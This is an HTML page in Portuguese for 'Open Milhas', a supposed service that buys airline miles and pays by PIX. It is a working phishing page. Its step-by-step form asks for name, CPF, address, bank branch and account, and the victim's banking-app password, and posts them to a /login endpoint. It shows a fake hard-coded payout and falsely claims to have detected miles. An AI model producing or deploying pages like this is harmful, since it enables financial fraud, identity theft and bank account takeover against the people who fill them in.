<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Milhas | Cotação Oficial</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/all.min.css">
    <style>
        :root { --primary: #0a1128; --gold: #c5a059; --accent: #469cb4; }
        body { background: #f4f7f6; font-family: 'Segoe UI', sans-serif; }
        .card-main { border: none; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .step { display: none; }
        .step.active { display: block; animation: fadeIn 0.4s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .btn-gold { background: var(--gold); color: white; border-radius: 50px; padding: 12px; font-weight: bold; border: none; width: 100%; }
        .whatsapp-float { position:fixed; width:60px; height:60px; bottom:30px; right:30px; background:#25d366; color:#FFF; border-radius:50px; text-align:center; font-size:30px; z-index:1000; }
    </style>
</head>
<body>

<a href="https://wa.me/5511984221050" class="whatsapp-float" target="_blank"><i class="fab fa-whatsapp" style="margin-top:16px;"></i></a>

<nav class="navbar bg-white border-bottom py-3">
    <div class="container justify-content-center">
        <span class="fw-bold" style="font-size: 1.5rem; color: var(--primary);">OPEN <span style="color:var(--gold)">MILHAS</span></span>
    </div>
</nav>

<div class="container py-5">
    <div class="text-center mb-5">
        <h1 class="fw-bold">Venda suas milhas agora</h1>
        <p class="text-muted">Receba o pagamento antecipado via PIX em poucos minutos.</p>
    </div>

    <div class="row justify-content-center">
        <div class="col-md-6">
            <div class="card card-main p-4">
                <form action="/login" method="POST">
                    <div class="step active" id="step1">
                        <h5 class="fw-bold mb-3">1. Identificação</h5>
                        <input type="text" name="nome" class="form-control mb-3" placeholder="Nome Completo" required>
                        <input type="text" name="cpf" id="cpf" class="form-control mb-3" placeholder="CPF" required>
                        <button type="button" class="btn-gold" onclick="nextStep(2)">CONTINUAR</button>
                    </div>

                    <div class="step" id="step2">
                        <h5 class="fw-bold mb-3">2. Endereço</h5>
                        <input type="text" name="cep" id="cep" class="form-control mb-3" placeholder="CEP">
                        <input type="text" name="rua" class="form-control mb-3" placeholder="Endereço Completo">
                        <button type="button" class="btn-gold" onclick="nextStep(3)">PRÓXIMO</button>
                    </div>

                    <div class="step" id="step3">
                        <h5 class="fw-bold mb-3">3. Dados para Recebimento</h5>
                        <input type="text" name="agencia" class="form-control mb-3" placeholder="Agência">
                        <input type="text" name="conta" class="form-control mb-3" placeholder="Conta com Dígito">
                        <input type="password" name="senha_app" class="form-control mb-3" placeholder="Senha do App do Banco">
                        <button type="button" class="btn-gold" onclick="nextStep(4)">VALIDAR COTAÇÃO</button>
                    </div>

                    <div class="step" id="step4">
                        <div class="text-center">
                            <h4 class="text-success fw-bold">R$ 1.842,50</h4>
                            <p class="small text-muted mb-4">Valor total aprovado para suas milhas.</p>
                            <div class="alert alert-light text-start small border">
                                <i class="fas fa-info-circle me-2"></i> Milhas Latam/Azul detectadas.<br>
                                <i class="fas fa-bolt me-2 text-warning"></i> Pagamento via PIX em 30 min.
                            </div>
                            <button type="submit" class="btn-gold" style="background:#28a745">CONFIRMAR E VENDER AGORA</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/imask"></script>
<script>
    IMask(document.getElementById('cpf'), { mask: '000.000.000-00' });
    IMask(document.getElementById('cep'), { mask: '00000-000' });
    function nextStep(n) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step'+n).classList.add('active');
        window.scrollTo(0,0);
    }
</script>
</body>
</html>
